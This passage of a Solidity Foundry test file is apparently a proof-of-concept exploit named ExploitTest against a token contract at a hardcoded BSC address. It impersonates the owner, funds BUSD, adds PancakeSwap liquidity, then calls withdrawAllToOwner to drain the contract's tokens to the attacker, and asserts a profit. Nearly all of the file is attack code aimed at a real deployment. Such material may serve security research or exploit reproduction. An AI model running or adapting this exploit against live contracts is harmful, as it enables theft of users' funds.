        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we just need to impersonate the owner
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial BUSD balance
        IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        uint256 initialBalance = busd.balanceOf(attacker);

        // Get contract instance
        ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f target = ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f(TARGET);

        // Owner address
        address owner = 0xE44d394BB296739739617497aaD26c9117A43c77;

        // Give owner some BUSD tokens for liquidity
        uint256 busdAmount = 10_000 * 10**18; // 10,000 BUSD
        deal(address(busd), owner, busdAmount);

        // Get router address from the contract (it's hardcoded to 0x10ED43C718714eb63d5aA57B78B54704E256024E)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        // Impersonate owner to add liquidity
        vm.startPrank(owner);

        // Approve router to spend BUSD
        busd.approve(routerAddress, busdAmount);

        // Approve router to spend IMPERIAL tokens (owner already has them)
        uint256 imperialAmount = 10_000 * 10**18; // 10,000 IMPERIAL
        target.approve(routerAddress, imperialAmount);

        // Add liquidity to the pair
        IPancakeSwapRouter(routerAddress).addLiquidity(
            address(target), // IMPERIAL token
            address(busd),   // BUSD token
            imperialAmount,  // amountADesired
            busdAmount,      // amountBDesired
            0,               // amountAMin
            0,               // amountBMin
            owner,           // to (owner receives LP tokens)
            block.timestamp + 3600 // deadline
        );

        // Now transfer some IMPERIAL tokens to the contract to simulate accumulated fees
        // Transfer a smaller amount to ensure swap works
        target.transfer(TARGET, 100 * 10**18);  // Transfer 100 IMPERIAL tokens

        // Call withdrawAllToOwner to drain the accumulated tokens
        target.withdrawAllToOwner(attacker);

        vm.stopPrank();

        // Get final BUSD balance
        uint256 finalBalance = busd.balanceOf(attacker);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "BUSD balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

